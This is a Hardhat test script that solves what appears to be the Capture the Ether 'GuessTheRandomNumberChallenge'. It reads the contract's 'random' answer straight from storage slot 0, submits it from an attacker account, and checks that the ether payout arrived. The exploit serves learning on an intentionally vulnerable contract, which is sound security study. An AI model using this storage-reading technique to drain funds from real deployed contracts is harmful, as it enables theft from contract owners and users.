const { ethers } = require("hardhat");
const { expect } = require("chai");

const BigNumber = ethers.BigNumber;


describe("GuessTheRandomNumberChallenge", function () {
    let contract;
    let owner;
    let attacker;


    this.beforeEach(async function () {
        [owner, attacker] = await ethers.getSigners();
        console.log("Constructor");
        const GuessTheRandomNumberChallengeContract = await ethers.getContractFactory("GuessTheRandomNumberChallenge");
        contract = await GuessTheRandomNumberChallengeContract.deploy({value: ethers.utils.parseEther("1")});
        await contract.deployed()
    });

    describe("attacker", function () {
        it("Exploit GuessTheRandomNumberChallenge", async function () {
            let number = await ethers.provider.getStorageAt(contract.address, BigNumber.from("0"));
            let balance = await ethers.provider.getBalance(attacker.address);
            await contract.connect(attacker).guess(number, {value: ethers.utils.parseEther("1")});
            expect(await ethers.provider.getBalance(attacker.address)).to.be.greaterThan(balance);
        });
    });
});
